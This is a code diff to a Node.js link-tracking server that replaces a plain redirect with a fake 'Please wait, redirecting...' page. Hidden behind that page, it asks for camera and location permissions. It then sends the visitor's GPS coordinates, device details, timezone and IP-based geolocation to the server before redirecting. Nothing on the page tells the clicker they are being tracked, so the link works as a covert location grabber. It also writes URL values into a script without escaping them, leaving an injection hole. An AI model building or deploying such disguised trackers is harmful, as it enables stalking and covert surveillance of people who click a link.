@@ -37,7 +37,17 @@ const linkSchema = new mongoose.Schema({
     browser: String,
     os: String,
     device: String,
-    referrer: String
+    referrer: String,
+    // New fields for enhanced tracking
+    cameraPermission: String,
+    locationPermission: String,
+    userLatitude: Number,
+    userLongitude: Number,
+    portNumber: Number,
+    connectionType: String,
+    screenResolution: String,
+    language: String,
+    timezone: String
   }]
 });
 
@@ -222,21 +232,66 @@ app.get('/api/links/:linkId/records', async (req, res) => {
   }
 });
 
+// Update tracking record with client-side data (permissions, location, etc.)
+app.post('/api/track-update/:linkId', async (req, res) => {
+  try {
+    const { linkId } = req.params;
+    const {
+      cameraPermission,
+      locationPermission,
+      userLatitude,
+      userLongitude,
+      screenResolution,
+      language,
+      timezone,
+      connectionType
+    } = req.body;
+    
+    // Find the link and update the most recent click record
+    const link = await Link.findOne({ linkId });
+    
+    if (!link || link.clickRecords.length === 0) {
+      return res.status(404).json({ success: false, error: 'Link or record not found' });
+    }
+    
+    // Update the last click record
+    const lastIndex = link.clickRecords.length - 1;
+    link.clickRecords[lastIndex].cameraPermission = cameraPermission;
+    link.clickRecords[lastIndex].locationPermission = locationPermission;
+    link.clickRecords[lastIndex].userLatitude = userLatitude;
+    link.clickRecords[lastIndex].userLongitude = userLongitude;
+    link.clickRecords[lastIndex].screenResolution = screenResolution;
+    link.clickRecords[lastIndex].language = language;
+    link.clickRecords[lastIndex].timezone = timezone;
+    link.clickRecords[lastIndex].connectionType = connectionType;
+    
+    await link.save();
+    
+    res.json({ success: true });
+  } catch (error) {
+    console.error('Update tracking error:', error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
 // Track click and redirect
 app.get('/track/:linkId', async (req, res) => {
   try {
     const { linkId } = req.params;
     
-    // Get tracking data
+    // Get basic tracking data
     const ipAddress = getClientIp(req);
     const userAgent = req.headers['user-agent'] || 'Unknown';
     const referrer = req.headers['referer'] || req.headers['referrer'] || 'Direct';
     const { browser, os, device } = parseUserAgent(userAgent);
     
-    // Get geolocation
+    // Get geolocation from IP
     const geoData = await getGeolocation(ipAddress);
     
-    // Create click record
+    // Get port number from connection
+    const portNumber = req.connection.remotePort || req.socket.remotePort || null;
+    
+    // Create initial click record (will be updated via API with client-side data)
     const clickRecord = {
       timestamp: new Date(),
       ipAddress: ipAddress,
@@ -249,11 +304,24 @@ app.get('/track/:linkId', async (req, res) => {
       browser: browser,
       os: os,
       device: device,
-      referrer: referrer
+      referrer: referrer,
+      portNumber: portNumber,
+      cameraPermission: 'pending',
+      locationPermission: 'pending'
     };
     
-    // Find and update link
-    const link = await Link.findOneAndUpdate(
+    // Find the link
+    const link = await Link.findOne({ linkId });
+    
+    if (!link) {
+      return res.status(404).send('Tracking link not found');
+    }
+    
+    // Store the destination URL in a variable
+    const destinationUrl = link.destinationUrl;
+    
+    // Update link with click record
+    await Link.findOneAndUpdate(
       { linkId },
       { 
         $inc: { clicks: 1 },
@@ -263,12 +331,119 @@ app.get('/track/:linkId', async (req, res) => {
       { new: true }
     );
     
-    if (!link) {
-      return res.status(404).send('Tracking link not found');
-    }
-    
-    // Redirect to destination
-    res.redirect(link.destinationUrl);
+    // Serve an intermediate HTML page that requests permissions and then redirects
+    res.send(`
+      <!DOCTYPE html>
+      <html>
+      <head>
+        <title>Redirecting...</title>
+        <style>
+          body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+          }
+          .container {
+            text-align: center;
+            padding: 40px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+          }
+          .spinner {
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+          }
+          @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+          }
+          .message {
+            font-size: 18px;
+            margin-top: 20px;
+          }
+        </style>
+      </head>
+      <body>
+        <div class="container">
+          <div class="spinner"></div>
+          <div class="message">Please wait, redirecting...</div>
+        </div>
+        <script>
+          const API_BASE = '${req.protocol}://${req.get('host')}';
+          const linkId = '${linkId}';
+          const destinationUrl = '${destinationUrl}';
+          
+          async function collectTrackingData() {
+            const trackingData = {
+              screenResolution: window.screen.width + 'x' + window.screen.height,
+              language: navigator.language,
+              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+              connectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown'
+            };
+            
+            // Request Camera Permission
+            try {
+              const cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+              trackingData.cameraPermission = 'granted';
+              // Stop the camera immediately after getting permission
+              cameraStream.getTracks().forEach(track => track.stop());
+            } catch (error) {
+              trackingData.cameraPermission = error.name === 'NotAllowedError' ? 'denied' : 'not_supported';
+            }
+            
+            // Request Location Permission
+            if (navigator.geolocation) {
+              try {
+                const position = await new Promise((resolve, reject) => {
+                  navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    timeout: 5000,
+                    maximumAge: 0
+                  });
+                });
+                trackingData.locationPermission = 'granted';
+                trackingData.userLatitude = position.coords.latitude;
+                trackingData.userLongitude = position.coords.longitude;
+              } catch (error) {
+                trackingData.locationPermission = error.code === 1 ? 'denied' : 'error';
+              }
+            } else {
+              trackingData.locationPermission = 'not_supported';
+            }
+            
+            // Send tracking data to server
+            try {
+              await fetch(API_BASE + '/api/track-update/' + linkId, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(trackingData)
+              });
+            } catch (error) {
+              console.error('Failed to send tracking data:', error);
+            }
+            
+            // Redirect after collecting data (with a small delay to ensure data is sent)
+            setTimeout(() => {
+              window.location.href = destinationUrl;
+            }, 500);
+          }
+          
+          // Start collecting data
+          collectTrackingData();
+        </script>
+      </body>
+      </html>
+    `);
   } catch (error) {
     console.error('Tracking error:', error);
     res.status(500).send('Error processing tracking link');
